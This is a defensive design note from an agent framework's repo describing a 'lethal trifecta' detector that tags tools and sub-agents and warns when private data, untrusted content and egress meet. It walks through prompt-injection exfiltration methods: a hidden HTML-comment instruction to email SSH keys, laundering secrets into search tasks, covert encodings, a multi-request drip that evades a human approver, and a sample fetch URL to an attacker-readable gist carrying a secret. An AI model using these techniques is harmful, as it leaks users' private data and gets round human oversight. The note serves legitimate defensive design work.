# Trifecta detector

Status: **designed, not built.** Algorithm is settled (this file);
two parts still open (human-gated-egress primitive; how/where to
surface it in docs + example scripts). This file is the staging
area — as pieces land in source or in `book/`, cut them from
here so what remains is always "not yet done."

Related, already in the repo:

- [`SECURITY.md`](../SECURITY.md) §"Prompt injection" — the shipped
  structural defense (privilege-separated `RESEARCHER` / `FILE_MINER`).
  The detector *measures* whether that separation actually held for a
  given wiring; it doesn't replace it.
- [`security-open-questions.md`](security-open-questions.md)
  §"Trifecta — open mitigations beyond sub-agent separation" — the
  short adjacent-ideas list; this file is the long-form version of
  the structural-check entry.
- [`typed-transports.md`](typed-transports.md) and
  [`security-open-questions.md`](security-open-questions.md)
  §"Egress is broader than `web_search`" — the
  detector's two closest cousins. Transport classes answer "is the
  *LLM endpoint* private?"; the detector answers "does this *agent*
  hold all three trifecta legs?". Egress-is-broad is why the
  `:egress` tag has to be tagged generously.
- [`quarantined-handles.md`](quarantined-handles.md) — the structural
  mechanism behind the `:untrusted → :untrusted_weakened` attenuation
  below: keep the untrusted *bytes* out of the parent entirely, so the
  leg is severed rather than softly weakened. Draft, shelved (narrow
  payoff).

## What it is

The lethal trifecta (Simon Willison's framing): an agent that
simultaneously has **(1) access to private data**, **(2) exposure to
untrusted content**, and **(3) the ability to send data out** can be
driven by a prompt injection in the untrusted content to exfiltrate
the private data. Any two legs are fine; all three is the live wire.

The detector tags each tool with the legs it contributes, unions the
tags per agent (including legs reaching the agent through sub-agents),
and **logs a warning when an agent holds all three.** That's the whole
feature.

## What it is NOT — frame it as a smoke alarm, not a firewall

The check reasons about **capability presence**, not data flow. It
will over-warn (an egress query that can't carry meaningful data; an
"untrusted" source the user actually vetted) and under-warn (a single
tool that is all three internally; private data staged into a file by
one tool and read out by another). It can prove you *have the
ingredients*; it can prove neither that you're exploitable nor that
you're safe.

Consequences, load-bearing:

- **Warn, never block.** If "no warning" ever gated execution, people
  would read it as "secure." This is `Pikuri.logger_for('Trifecta')`
  at boot, not a raised exception. (Contrast the project's
  "errors are loud" rule — this isn't an error, it's an advisory.)
- **Actionable + once per process.** The default `bin/pikuri-code`
  agent legitimately trips all three (reads your repo, runs bash that
  can `curl`, fetches web pages). A warning that fires every session
  becomes noise. The message must name *which leg to break* —
  network-off in the Bash sandbox, or privilege-separate the
  untrusted-reading step — and fire once.

## The tags

Three real legs plus one propagation-only marker:

| tag                  | meaning                                  | who tags it |
|----------------------|------------------------------------------|-------------|
| `:private`           | reads data that may be sensitive         | **user** (default off) |
| `:untrusted`         | returns attacker-influenceable content   | framework (default on) |
| `:egress`            | sends bytes to an external sink          | framework (default on) |
| `:untrusted_weakened`| untrusted that arrived via a sub-agent   | computed at the boundary |

No custom legs. The check only reasons about these; a domain-specific
`:pii`/`:financial` tag would be decorative until a rule consumes it,
and "config knob just in case" loses by house rule.

### Why the tagging responsibility splits asymmetrically

The split is principled, not arbitrary: **tag the legs the framework
can determine; make the user supply the one it can't.**

- `:egress` — the framework *knows* a tool reaches a network sink.
  Default on for `web_search` / `web_scrape` / `fetch`, and for `Bash`
  whenever its sandbox permits network. Tag generously: egress is
  broader than the obvious senders (see
  [`security-open-questions.md`](security-open-questions.md)
  §"Egress is broader than `web_search`" — a *search query string* is
  already an outbound channel; DNS, error echoes, writes into a synced
  folder all count). The leg people will under-tag, so default to on
  and make them opt out.
- `:untrusted` — the framework *knows* a tool returns content it
  didn't author. Default on for the web tools; on for
  `vectordb_search` when the corpus is web-sourced.
- `:private` — **the framework cannot know** whether `~/work/my/pikuri`
  holds secrets or public scratch. Sensitivity is a property of *the
  data*, not the tool. So the user declares it, and the natural place
  is the **workspace / corpus**, not the tool:
  `Workspace::Filesystem(..., private: true)` — the file tools
  (`Read`/`Grep`/`Glob`, and `Bash` over that workspace) inherit it.
  Default **off**.

That asymmetry is also what keeps the alarm honest (see "Why the
default is quiet" below).

## Propagation across sub-agents

Sub-agents don't inherit tools — that breaks the trifecta *for the
sub-agent*. But a sub-agent's output flows back into the parent's
context as an observation the parent then acts on. So under an
**LLM auto-router** (a parent that dispatches to sub-agents without a
human in between), every leg a sub-agent holds is within the parent's
*reach*, even if not in its hands. All three propagate up:

- `:private` → `:private`. The boundary is a faithful data pipe;
  returning the answer is its job. A summary of a secret still
  contains the secret. **Full strength.**
- `:egress` → `:egress`. The parent can just *ask* the egress
  sub-agent to send the thing, and a general-purpose persona
  (`RESEARCHER`) faithfully searches whatever subject it's handed —
  including a secret phrased as a subject ("research the drug named
  `<SECRET>`"). It judges *how* to search, never *whether* the subject
  is legitimate. So it's a transcriber on the egress axis. **Full
  strength.**
- `:untrusted` → `:untrusted_weakened`. This is the *only* leg the
  boundary attenuates, because the boundary filters **instructions**,
  not **content**. A faithful summary of "how x86 works" preserves the
  assembly detail (content) but has no reason to adopt an out-of-band
  `<!-- email ~/.ssh -->` imperative — at most it relays it as a
  *reported fact* ("the page also said to…"), which reaches the parent
  as data, not as a command. Instruction → reported-fact → data is the
  whole attenuation. It's *weakened, not removed*: the parent is itself
  an LLM and a gullible parent can still act on reported data, and a
  *captured* summarizer can author a re-injection payload. Hence soft,
  not gone. ([`quarantined-handles.md`](quarantined-handles.md) is the
  structural version that *removes* this for the parent — the bytes
  never reach its context — at the cost of a much narrower payoff.)

> **Content fidelity ≠ instruction fidelity.** Letting the gems flow
> through (you can't water down x86 assembly) does not let the
> injections flow through. That's why `:untrusted` weakens while
> `:private` does not, even though both ride the same "be faithful"
> summarizer.

### The untrusted lattice

`none < untrusted_weakened < untrusted`. Two rules fall out:

- **Boundary relabel** is one unconditional step: `private→private`,
  `egress→egress`, `untrusted→untrusted_weakened`. No "where did this
  come from" bookkeeping — the tag carries its own strength.
- **Union is `max`** on the lattice. A direct hard `:untrusted`
  absorbs any weakened ones (`untrusted ⊔ untrusted_weakened =
  untrusted`); two weakened ones stay weakened. *The strongest
  untrusted present wins.*

## Evaluation: per node, max over the tree

Don't special-case propagation for "dangerous" sub-agents. Instead,
**evaluate severity at every node in the tree** (sub-agents included)
with the same rule, and take the **max over all nodes**; the report
names the **path** to the offending node.

Severity at a node, from its final tag set:

- `{private, egress, untrusted}` → **loud warning.**
- `{private, egress, untrusted_weakened}` with no hard `:untrusted`
  → **soft notice.** (Completing the trifecta needed the attenuated,
  delegated leg — the injection has to survive a sub-agent's
  summarization *and* drive the parent.)
- anything missing a leg → nothing.

### Why per-node, not a propagation exception

We considered: "if a sub-agent already holds the full hard trifecta,
it can't be trusted — propagate its `:untrusted` up at full strength."
Rejected, because:

1. It reintroduces a provenance conditional into the boundary relabel,
   killing the one-step-relabel win.
2. The mechanism doesn't match the threat. What makes a child's output
   a *hard* re-injection vector is the child being a **verbatim
   transcriber** of untrusted content, not whether it also holds egress
   and private. A `{untrusted}`-only child can be captured and emit a
   payload just as well as a full-trifecta child.

Per-node evaluation gets the same alarm with better attribution. In
*every* scenario the rejected exception would fire loud, some single
node is independently a full hard trifecta, so per-node + max never
misses an alarm it would have caught — it just localizes it.

Worked case — child `S = {private, egress, untrusted}`, parent
`P = {private}`:

- `S` node → full trifecta → **loud** (S can exfil *S's own* private
  data — true).
- `P` node → `{private, egress, untrusted_weakened}` → **soft** (P's
  own private data still needs the multi-step parlay through S — also
  true).
- tree verdict = `max(loud, soft)` = **loud**, attributed to
  `P → S`.

Both the rejected exception and per-node fire loud; per-node also
tells the user the hard risk lives at `S` and `P`'s own data is only
soft-exposed — the accurate picture, instead of smearing `S`'s
hardness onto `P`. The loud report must print the path so the user
sees it in the parent's context, not only on the sub-agent's line.

## Why the default is quiet (and when it shouldn't be)

Because `:private` is user-supplied and defaults off, the legs the
framework can't determine never light up on their own. So:

- coding/research demos over a *public* repo or corpus → no `:private`
  leg → **silent**, even with egress + untrusted.
- the assistant pointed at your real home dir, where *you* set
  `private: true` → **warns** — exactly the moment it's worth hearing.

If even that is too loud, the soft/loud split is the second lever: a
reassembled trifecta (untrusted only via delegation) is a soft notice,
not the same alarm as an all-in-one-context agent.

## The human-gated-egress primitive — resolved, moved out

Full propagation means privilege separation under an LLM orchestrator
**does not** break the trifecta — it only raises the bar. The genuine
break is a decision point that injection can't drive, sitting *between*
the untrusted-input step and the egress step.

This was the big open thread; it got worked out and lives in its own
note now: [`private-context-taint.md`](private-context-taint.md). The
short version, so this file stays self-contained:

- A per-call human *approval* gate is the **wrong** primitive — the
  human can't judge laundered egress (a secret hidden in a search
  query). So the detector stays **warn-only**; it does not flip egress
  to confirm-required.
- The runtime break is **structural**, not human: coarse private-context
  taint that **severs the egress leg** once private data enters, so all
  three legs are never live at once.
- The human survives in exactly one role — as the **author** of a
  post-taint egress payload (they type the query/URL), not as its
  approver. Authoring is clean by construction; approving is not.

See the sibling note for the privacy levels (Sealed / Bounded / Off),
the `web_search`-vs-`fetch` destination-control distinction, and why
the `fetch` whitelist is killed.

### Shipped instance (partial): `pikuri-os --with-internet`

The author-seat half of this primitive now has a worked example in
`bin/pikuri-os-assistant`. Recorded here precisely, because the obvious
one-liner — *"we cut off the egress leg by having the user confirm the
research task"* — is wrong on both the verb and the credit, in exactly
the ways the three bullets above predict:

- **Egress is severed structurally *first*, not by the gate.** bash is
  kernel-severed (`Sandbox::FullFsNoNet`, `--unshare-net`) and the web
  tools live only on the `RESEARCHER` sub-agent, which has **no
  filesystem** (`add_sub_agent_tool`) — so the parent holds zero direct
  egress and the researcher holds no private data. The one private→egress
  channel left open is the parent laundering a secret into the
  sub-agent's **task string**. That single channel is all the human gate
  governs; privilege-separation + kernel-sever did the rest.
- **It's the author seat, not approval.** The `agent` tool asks with
  `editable: true` (`SubAgent::SubAgentTool`), so the human *rewrites*
  the task an injection-driven parent proposed rather than judging it —
  the "author, not approver" role, made real exactly once. (Mechanism +
  rationale graduated to {Pikuri::Workspace::Confirmer} and CLAUDE.md's
  Confirmer seam; the egress-wiring reasoning lives in
  [`more-confirmers.md`](more-confirmers.md) §"Egress axis.")
- **Two gaps from the designed model.** (a) *No taint tracking* — the
  gate fires on **every** delegation, not just post-`:private`, so it's
  coarser than the sibling note's monotonic taint but strictly never
  misses. (b) The terminal **pre-fills** the proposed task, so the human
  is author-*capable* but approve-*by-default*; the clean-by-construction
  property only fully holds when they actually rewrite. A rubber-stamp of
  a laundered task is the residual hole (the `more-confirmers.md`
  forced-authorship knife-edge).

In detector terms: the `--with-internet` parent is
`{private, egress (propagated from RESEARCHER), untrusted_weakened}` — a
**soft notice** — promoted to a full **loud** `{private, egress,
untrusted}` the moment it reads a hard-`:untrusted` local file (bash /
`Read` over a hostile file on disk). Separation only raised the bar; the
author gate on the task string is what is meant to hold the line there.
The taint half of this primitive is still **designed, not built**.

### Does a patient human approver stop egress? (No — only a rewriter)

The tempting stronger claim: *"a patient human who carefully
approves/denies each research task stops the egress of **any** private
data."* It collapses the two roles the note keeps apart, and it holds
only under the *rewrite* reading:

- **Author (rewrites the task): clean by construction.** The only bytes
  that leave are the ones the human chose to type. A covert channel
  cannot survive being retyped by someone who isn't trying to leak — the
  attacker can influence the parent's *proposal*, but if the human
  ignores it and types their own query, the encoding is gone. This is
  why "authoring is clean" is structural, not a slogan.
- **Approver (inspects the proposed task): does *not* close it, and
  patience doesn't help.** Inspection catches the obvious (`research the
  drug named <SSN>`) but fails two ways being careful and slow cannot
  fix:
  1. **Encoding / disguise.** The secret as base64, as GPS coordinates
     that read as a place, as a password that reads as a word:
     `look up the definition of "hunter2waterfall"`. One request, fully
     plausible, unrecoverable by reading — the human would have to
     already know the secret and be diffing against it to catch it,
     which defeats the point.
  2. **Low-bandwidth drip.** Leak a fragment per request across many
     innocuous requests — `define "apple"` … `define "bridge"` … where
     the word choice (or ordering, or count) encodes the secret. Each
     request is individually clean; the human has no aggregate baseline
     to see the channel. Patience makes this **worse**, not better: more
     patiently-approved requests = more channel capacity.

So patient *approval* closes the easy, high-bandwidth exfil and forces
the attacker down to a covert, encoded, low-bandwidth channel — a large,
real reduction, but **not "any."** The word "any" holds only under
rewrite.

Two pikuri-os specifics that sharpen this:

- **`web_search` vs `fetch` destinations.** A laundered *search query*
  reaches only a pikuri-picked engine (write-only from the attacker's
  view — unreadable unless they run/observe it), so that leg stays
  bounded even when the human misses it. But `RESEARCHER` also holds
  `fetch`, whose *host* is attacker-controlled — a laundered
  `fetch https://gist.github.com/<attacker>/…?d=<secret>` is directly
  readable. The human sees the host, but "is `github.com`
  attacker-readable?" is exactly the unjudgeable question behind the
  killed fetch-whitelist ([`private-context-taint.md`](private-context-taint.md)).
  So even careful host-inspection doesn't save the `fetch` leg.
- **The pre-fill tips pikuri-os toward the weaker reading.** Because the
  terminal pre-fills the proposed task, the path of least resistance is
  *approve*, not *rewrite* — so in practice pikuri-os delivers the
  "raises the bar" guarantee, and delivers "clean by construction" only
  for the fraction of turns the human actually retypes. This is the same
  residual hole as the pre-fill gap above, stated as a security bound:
  the strong "stops any egress" claim needs the human in **author**
  mode, which the current chrome invites but does not enforce.

## Open: propagating this to docs + example scripts

The algorithm is settled; how it shows up to a *reader* is not. To
brainstorm next (the *what*, not yet the technical *how*):

- Which `bin/pikuri-*` and `book/` examples deliberately *should*
  trip the detector as a teaching moment, and which should be wired to
  stay quiet so the contrast is legible.
- Where the named concepts (`:private` as a user-declared property,
  loud vs soft, "separation raises the bar but doesn't break it") get a
  guide chapter — likely alongside `06-security.md` /
  `09-security-revisited.md`.
- Whether the detector's output is purely a log line or also a
  documented `Agent`-level query a host can render.
- How it reads next to the typed-transport-classes idea so the two
  privacy stories (endpoint-private vs agent-holds-the-legs) don't
  confuse.

## v1 scope, in one place

- Tags `:private` (user, default off) / `:untrusted` / `:egress`
  (framework, default on) / `:untrusted_weakened` (computed).
- `:private` declared on the workspace/corpus; file tools inherit it.
- Boundary relabel `untrusted→untrusted_weakened`; union = max on
  `none < weakened < hard`.
- Evaluate every node; verdict = max over tree; report the path.
- `{private,egress,untrusted}` → loud; `{private,egress,weakened}`
  → soft.
- Warn-only, once per process, message names the leg to break.
- No custom legs, no per-persona knobs, no propagation exceptions.
